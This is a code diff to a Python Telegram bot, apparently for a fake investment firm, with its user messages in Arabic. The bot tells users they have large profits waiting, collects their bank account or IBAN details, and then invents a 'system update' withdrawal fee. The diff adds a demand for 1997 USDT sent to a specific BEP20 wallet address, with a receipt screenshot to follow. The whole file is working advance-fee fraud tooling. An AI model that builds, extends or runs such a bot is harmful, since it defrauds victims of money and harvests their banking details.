@@ -30,7 +30,7 @@ user_custom_data = {}
 custom_profits = {
     "354101": {"amount": "45,500", "assigned_user_id": None},
     "00554": {"amount": "45,500", "assigned_user_id": None},
-    "358556": {"amount": "45,500", "assigned_user_id": None},
+    "3585556": {"amount": "45,500", "assigned_user_id": None},
     "189415": {"amount": "1500", "assigned_user_id": None}
 }
 USED_CODES = set()
@@ -64,7 +64,7 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
             "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
-            "مثال:\n`/setprofit 7004113433 45500 358556`",
+            "مثال:\n`/setprofit 7004113433 45500 3585556`",
             parse_mode="Markdown"
         )
         return
@@ -188,8 +188,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         await msg.reply_text(
-            "✅ **تم استلام الحساب البنكي وحفظه بنجاح!**\n\n"
-            "الرجاء اختيار أحد الخيارات أدناه لإتمام عملية السحب:",
+            "💳 **إدخال الحساب البنكي:**\n\n"
+            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
@@ -306,7 +306,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
-        # إرسال الرسالة الجديدة المحدثة بالكامل مع زر دفع
+        # إرسال الرسالة المحدثة الخاصة بتحديث نظام البيانات ورسوم السحب
         await query.edit_message_text(
             "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
             reply_markup=reply_markup,
@@ -320,9 +320,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "pay_fees":
-        await query.edit_message_text(
+        # تفاصيل دفع الرسوم المطلوبة بالكامل بالشكل الجديد المطلوب
+        pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
-            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم **إرسال صورة الوصل (Screenshot)** هنا في المحادثة ليتم تأكيد سحبك بنجاح.",
+            "العملة: **USDT**\n"
+            "المبلغ: **1997 دولار**\n"
+            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
+            "العنوان:\n"
+            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
+            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
+        )
+        await query.edit_message_text(
+            pay_details,
             parse_mode="Markdown"
         )
 
@@ -339,7 +348,7 @@ def main():
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل الميزات ورسالة الرسوم المحدثة...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل تفاصيل دفع الرسوم وتحديثاتها...")
     app.run_polling()
 
 if __name__ == "__main__":
